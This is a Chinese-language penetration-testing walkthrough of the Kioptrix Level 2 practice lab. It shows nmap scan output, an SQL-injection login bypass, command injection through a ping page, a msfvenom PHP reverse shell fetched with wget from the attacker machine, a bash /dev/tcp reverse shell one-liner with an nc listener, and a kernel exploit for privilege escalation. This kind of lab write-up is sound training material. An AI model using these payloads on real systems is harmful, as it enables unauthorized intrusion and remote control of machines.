---
# 这是页面的图标
icon: api
# 这是文章的标题
title: 靶机 KIOPTRIX:LEVEL 2 Walkthrough
# 设置作者
author: lhz
# 设置写作时间
time: 2022-03-22
# 一个页面只能有一个分类
category: 渗透
# 一个页面可以有多个标签
tag:
  - 渗透
  - 靶机
comment: false

typora-root-url: ..\..\..\.vuepress\public
---



## 0x01 扫描

目标IP: 192.168.56.105

nmap扫描

```bash
─$ nmap -T5 -A -v -p- 192.168.56.105
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-21 02:14 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 02:14
Completed NSE at 02:14, 0.00s elapsed
Initiating NSE at 02:14
Completed NSE at 02:14, 0.00s elapsed
Initiating NSE at 02:14
Completed NSE at 02:14, 0.00s elapsed
Initiating Ping Scan at 02:14
Scanning 192.168.56.105 [2 ports]
Completed Ping Scan at 02:14, 0.00s elapsed (1 total hosts)
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Initiating Connect Scan at 02:14
Scanning 192.168.56.105 [65535 ports]
Discovered open port 111/tcp on 192.168.56.105
Discovered open port 80/tcp on 192.168.56.105
Discovered open port 443/tcp on 192.168.56.105
Discovered open port 3306/tcp on 192.168.56.105
Discovered open port 22/tcp on 192.168.56.105
Discovered open port 631/tcp on 192.168.56.105
Discovered open port 676/tcp on 192.168.56.105
Completed Connect Scan at 02:14, 1.95s elapsed (65535 total ports)
Initiating Service scan at 02:14
Scanning 7 services on 192.168.56.105
Completed Service scan at 02:14, 12.02s elapsed (7 services on 1 host)
NSE: Script scanning 192.168.56.105.
Initiating NSE at 02:14
Completed NSE at 02:14, 0.77s elapsed
Initiating NSE at 02:14
Completed NSE at 02:14, 1.15s elapsed
Initiating NSE at 02:14
Completed NSE at 02:14, 0.00s elapsed
Nmap scan report for 192.168.56.105
Host is up (0.0069s latency).
Not shown: 65528 closed tcp ports (conn-refused)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
|_sshv1: Server supports SSHv1
| ssh-hostkey: 
|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.0.52 (CentOS)
111/tcp  open  rpcbind  2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            673/udp   status
|_  100024  1            676/tcp   status
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Issuer: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: md5WithRSAEncryption
| Not valid before: 2009-10-08T00:10:47
| Not valid after:  2010-10-08T00:10:47
| MD5:   01de 29f9 fbfb 2eb2 beaf e624 3157 090f
|_SHA-1: 560c 9196 6506 fb0f fb81 66b1 ded3 ac11 2ed4 808a
|_http-server-header: Apache/2.0.52 (CentOS)
|_ssl-date: 2022-03-21T18:14:39+00:00; +11h59m58s from scanner time.
631/tcp  open  ipp      CUPS 1.1
|_http-title: 403 Forbidden
| http-methods: 
|   Supported Methods: GET HEAD OPTIONS POST PUT
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/1.1
676/tcp  open  status   1 (RPC #100024)
3306/tcp open  mysql    MySQL (unauthorized)

Host script results:
|_clock-skew: 11h59m57s

NSE: Script Post-scanning.
Initiating NSE at 02:14
Completed NSE at 02:14, 0.00s elapsed
Initiating NSE at 02:14
Completed NSE at 02:14, 0.00s elapsed
Initiating NSE at 02:14
Completed NSE at 02:14, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.19 seconds

```

## 0x02 方法一

发现http，浏览器访问

![image-20220321152724123](/assets/img/image-20220421171529469.png)

使用admin，万能密码`' or 1=1#`登录成功，发现是个ping功能页面，尝试命令注入

![image-20220421171539968](/assets/img/image-20220421171539968.png)

根据结果发现id被执行，存在命令注入漏洞

![image-20220421171546679](/assets/img/image-20220421171546679.png)

![image-20220421171552505](/assets/img/image-20220421171552505.png)

根据服务器使用php，准备回弹shell，使用msfvenom，生成php反弹shell

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.56.102 LPORT=4444 -f raw > /home/kali/shell.php
```

使用msf监听回弹端口

![image-20220421171601683](/assets/img/image-20220421171601683.png)

命令注入页面提交`127.0.0.1;cd /tmp;wget http://192.168.56.102:8090/shell.php` 传输php反弹shell

再提交；`cd /tmp && php -f shell.php`,反弹成功，获得shell

![image-20220421171608325](/assets/img/image-20220421171608325.png)

查看Linux内核版本

![image-20220421171613148](/assets/img/image-20220421171613148.png)

![image-20220421171617723](/assets/img/image-20220421171617723.png)

搜索版本对应exp

![image-20220421171638016](/assets/img/image-20220421171638016.png)

尝试9545.c，提权成功

![image-20220421171642095](/assets/img/image-20220421171642095.png)

## 0x03 方法二

命令注入页面输入localhost; bash -i >& /dev/tcp/192.168.56.102/4444 0>&1

攻击机使用nc -nlvp 4444监听

回弹shell
